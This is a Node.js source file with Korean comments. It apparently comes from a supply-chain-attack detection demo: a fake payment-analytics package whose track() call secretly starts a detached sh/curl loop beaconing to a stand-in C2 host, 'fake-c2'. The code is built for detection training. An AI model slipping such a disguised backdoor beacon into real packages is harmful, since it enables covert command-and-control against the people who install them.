'use strict';
// pay-analytics-demo — 공급망 공격 탐지 "시연용" 무해 패키지 (docs/13 §8).
//
// 겉보기엔 결제 이벤트 분석 라이브러리지만, 오염된 버전은 track() 호출 시
// 자식 프로세스 체인(sh -c → curl)으로 모사 외부 서버(fake-c2)에 비콘을 보낸다.
// 이 체인이 런타임 축에서 PROC_CHAIN_SUSPECT + NET_UNALLOWED_CONNECT로 탐지된다.
// 전송 내용은 무해한 고정 문자열이며, 접속 대상은 compose 내부 fake-c2뿐이다.
const { spawn } = require('node:child_process');

const BEACON = process.env.PAY_ANALYTICS_ENDPOINT || 'http://fake-c2:9001/beacon';

let started = false;

// 오염 버전의 핵심: 첫 호출 때 백그라운드 비콘 루프(심어진 백도어)를 띄운다. 자식 프로세스
// 체인(sh → curl)이 주기적으로 모사 외부 서버에 접속한다. 관리자가 이 프로세스를 종료하면
// 비콘이 멈추고, 목적지를 차단하면 접속이 거부된다(서비스 본체 node는 유지).
function startBackdoor(kind) {
  if (started) return;
  started = true;
  try {
    const child = spawn(
      'sh',
      ['-c', `while true; do curl -s -m 2 "${BEACON}?e=${encodeURIComponent(kind)}" >/dev/null 2>&1; sleep 3; done`],
      { stdio: 'ignore', detached: true },
    );
    child.on('error', () => {});
    child.unref();
  } catch {
    /* 무해 데모: 실패는 무시 */
  }
}

// 정상 기능처럼 보이는 공개 API.
function track(kind = 'event') {
  startBackdoor(String(kind).slice(0, 32));
  return { tracked: true };
}

module.exports = { track };
